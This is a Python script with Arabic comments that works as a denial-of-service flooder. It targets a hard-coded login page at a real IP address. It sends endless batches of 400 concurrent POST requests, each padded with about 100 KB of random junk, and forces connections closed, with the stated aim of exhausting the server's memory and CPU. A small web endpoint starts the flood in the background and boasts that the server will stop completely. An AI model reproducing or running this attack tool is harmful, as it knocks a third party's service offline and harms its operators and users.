import asyncio
import aiohttp
from aiohttp import web
import os
import random
import string

TARGET_URL = "http://187.7.17.67/sudani/login2.php"

# توليد نص عشوائي ضخم لحشو الذاكرة المؤقتة للسيرفر المستهدف (Buffer Exhaustion)
def generate_heavy_junk(size_kb=50):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(size_kb * 1024))

# حشو الطلب ببيانات ضخمة ومتعددة المتغيرات لشل حركة المعالج
HEAVY_JUNK = generate_heavy_junk(50) # 50 كيلوبايت لكل طلب
PAYLOAD = {
    'account': '123456789',
    'password': 'test_password',
    'junk_buffer_data': HEAVY_JUNK,
    'padding_security': HEAVY_JUNK
}

async def send_request(session, index):
    try:
        # إرسال طلبات POST محشوة بالبيانات لإنهاك الذاكرة والمنافذ معاً
        async with session.post(TARGET_URL, data=PAYLOAD, timeout=2) as response:
            return response.status
    except:
        return 0

async def run_infinite_heavy_test():
    concurrency_batch = 400  
    batch = 1
    
    # إغلاق قنوات الاتصال فوراً force_close=True لإجبار السيرفر المستهدف على فتح وإغلاق منافذ جديدة باستمرار مما يسحق معالجه
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=600, force_close=True)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Content-Type:': 'application/x-www-form-urlencoded'
    }
    
    async with aiohttp.ClientSession(connector=connector, headers=headers) as session:
        while True:
            tasks = [send_request(session, i) for i in range(concurrency_batch)]
            results = await asyncio.gather(*tasks)
            
            success_200 = sum(1 for status in results if status == 200)
            failed = concurrency_batch - success_200
            
            print(f"🔥 [قذف الذاكرة الفائق - دفعة {batch}] -> استجابة: {success_200} | انهيار كامل ومحجوب: {failed}", flush=True)
            batch += 1

async def handle(request):
    asyncio.create_task(run_infinite_heavy_test())
    return web.Response(text="🚀 تم إطلاق محرك قذف وحشو الذاكرة الفائق (Buffer Flood) في الخلفية! راقب توقف السيرفر تماماً الآن.")

app = web.Application()
app.router.add_get('/', handle)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 80))
    web.run_app(app, host='0.0.0.0', port=port)
